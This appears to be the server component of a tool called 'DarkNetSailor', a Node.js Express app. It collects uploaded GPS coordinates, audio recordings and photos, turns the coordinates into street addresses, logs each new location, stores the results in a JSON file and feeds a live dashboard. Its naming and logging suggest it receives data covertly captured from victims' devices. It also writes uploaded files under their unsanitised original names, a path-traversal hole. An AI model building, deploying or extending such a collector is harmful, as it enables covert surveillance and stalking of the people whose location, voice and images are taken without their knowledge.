const express = require('express');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const WebSocket = require('ws');
const cors = require('cors');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json({ limit: '50mb' }));

const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        const dir = 'uploads/';
        if (!fs.existsSync(dir)) fs.mkdirSync(dir);
        cb(null, dir);
    },
    filename: (req, file, cb) => {
        cb(null, file.originalname);
    }
});
const upload = multer({ storage: storage });

const server = app.listen(PORT, () => {
    console.log(`\n=========================================`);
    console.log(`[+] DarkNetSailor Server running on port ${PORT}`);
    console.log(`[+] Open http://localhost:${PORT}`);
    console.log(`=========================================\n`);
});
const wss = new WebSocket.Server({ server });

async function getAddress(lat, lon) {
    try {
        const response = await axios.get(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&accept-language=en`, {
            headers: { 'User-Agent': 'DarkNetSailor/1.0' }
        });
        const address = response.data.address;
        return `${address.road || 'N/A'}, ${address.city || address.town || address.village || 'N/A'}, ${address.state || 'N/A'}, ${address.country || 'N/A'}`;
    } catch (error) {
        return 'Address not found';
    }
}

app.post('/api/upload', upload.single('file'), async (req, res) => {
    const { type, lat, lon, accuracy } = req.body;
    
    if (type === 'location') {
        const address = await getAddress(lat, lon);
        console.log(`\n=========================================`);
        console.log(`📍 New Location Received!`);
        console.log(`🌍 Lat: ${lat} | Lon: ${lon}`);
        console.log(`🏠 Address: ${address}`);
        console.log(`=========================================\n`);
        
        const locationData = { latitude: lat, longitude: lon, accuracy, address, timestamp: new Date().toISOString() };
        let locations = [];
        try {
            if (fs.existsSync('locations.json')) locations = JSON.parse(fs.readFileSync('locations.json', 'utf8'));
        } catch (e) {}
        locations.push(locationData);
        fs.writeFileSync('locations.json', JSON.stringify(locations, null, 4));
    } 
    else if (req.file) {
        if (type === 'audio') console.log(`[🎤] Audio: ${req.file.filename}`);
        else if (type === 'photo') console.log(`[📸] Photo: ${req.file.filename}`);
    }
    
    res.status(200).send('OK');
});

wss.on('connection', (ws) => {
    console.log('[*] Dashboard connected.');
});
